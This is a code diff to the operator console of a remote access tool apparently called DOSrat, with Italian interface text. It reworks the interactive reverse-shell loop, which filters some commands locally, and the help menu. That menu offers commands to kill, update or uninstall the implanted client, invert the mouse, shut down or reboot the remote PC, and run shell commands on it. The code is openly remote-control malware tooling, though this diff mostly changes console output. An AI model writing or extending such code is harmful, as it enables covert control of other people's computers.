@@ -387,6 +387,7 @@ bool GetInfo(SOCKET Sock, int ID)
 
     cout << "Informazioni ricevute:" << endl;
     cli.Table(Header, Body);
+    cout << endl;
 
     return true;
 }
@@ -525,10 +526,15 @@ bool RestartClient(SOCKET Sock, int ID)
 
 bool ReverseShell(SOCKET Sock)
 {
+    CLInterface cli;
+    TextColor tc;
+
 	string Res = "";
 	string Cmd = "";
 	string Path = "";
 	
+    cout << endl;
+
     if (COMUNICAZIONI::ReverseShell(Sock, "reverseshell") == "OK")
     {
 		while (true)
@@ -541,14 +547,30 @@ bool ReverseShell(SOCKET Sock)
 			cout << Path << ">";
 			getline(cin, Cmd);
 			
-			Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
-			
-			if (Res == "")
-				return false;
-			else if (Res == "Reverse shell closed")
-				return true;
-			
-			cout << Res;
+            if (ToLowerCase(Cmd).substr(0, 3) == "ftp")
+                cout << "Non supportato.\n" << endl;
+            else if (ToLowerCase(Cmd).substr(0, 4) == "ping" && (ToLowerCase(Cmd).find("-t") != string::npos || ToLowerCase(Cmd).find("/t") != string::npos))
+                cout << "Non supportato.\n" << endl;
+            else if (ToLowerCase(Cmd).substr(0, 3) == "cls")
+            {
+                system("cls");
+                StampaTitolo(1);
+                cli.SubTitle("Sessione Comandi", 60, tc.Green);
+            }
+            else
+            {
+                Res = COMUNICAZIONI::ReverseShell(Sock, Cmd);
+
+                if (Res == "")
+                    return false;
+                else if (Res == "Reverse shell closed")
+                {
+                    cout << endl;
+                    return true;
+                }
+
+                cout << Res;
+            }
 		}
     }
 
@@ -578,11 +600,14 @@ void Sessione(int ID, SOCKET Sock)
         {
             cout << endl;
             cli.SubTitle("Client", 20, tc.Blue);
-            StampaHelp("Reconnect\t\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
-            StampaHelp("Killclient / Kill\t", "- Termina il processo del Client.");
-            StampaHelp("Updateclient / Update\t", "- Aggiorna il Client con un eseguibile locale.");
-            StampaHelp("Uninstall\t\t", "- Disinstalla il Client dal PC remoto.");
-            StampaHelp("Restartclient / Restart\t", "- Termina il Client e lo riavvia.");
+            StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
+            StampaHelp("Killclient\t", "- Termina il processo del Client.");
+            cout << char(192) << char(196) << "Kill" << endl;
+            StampaHelp("Updateclient\t", "- Aggiorna il Client con un eseguibile locale.");
+            cout << char(192) << char(196) << "Update" << endl;
+            StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
+            StampaHelp("Restartclient\t", "- Termina il Client e lo riavvia.");
+            cout << char(192) << char(196) << "Restart" << endl;
             cout << endl;
 
             cli.SubTitle("System", 20, tc.Lime);
@@ -590,13 +615,16 @@ void Sessione(int ID, SOCKET Sock)
             StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
             StampaHelp("Shutdown\t", "- Spegne il PC.");
             StampaHelp("Reboot\t\t", "- Riavvia il PC.");
-			StampaHelp("Reverseshell / Revshell\t", "- Ottieni accesso alla console dei comandi del PC.");
+			StampaHelp("Reverseshell\t", "- Lancia comandi sulla shell del PC remoto.");
+            cout << char(192) << char(196) << "Revshell" << endl;
             cout << endl;
 
             cli.SubTitle("Utility", 20, tc.Purple);
-            StampaHelp("Exit / Close\t", "- Torna al menu principale.");
-            StampaHelp("Clear / Cls\t", "- Pulisce la console da tutti i comandi precedenti.");
-            StampaHelp("Help\t\t", "- Mostra la lista dei comandi.");
+            StampaHelp("Exit\t", "- Torna al menu principale.");
+            cout << char(192) << char(196) << "Close" << endl;
+            StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
+            cout << char(192) << char(196) << "Cls" << endl;
+            StampaHelp("Help\t", "- Mostra la lista dei comandi.");
             cout << endl;
         }
         else if (cmd == "getinfo")
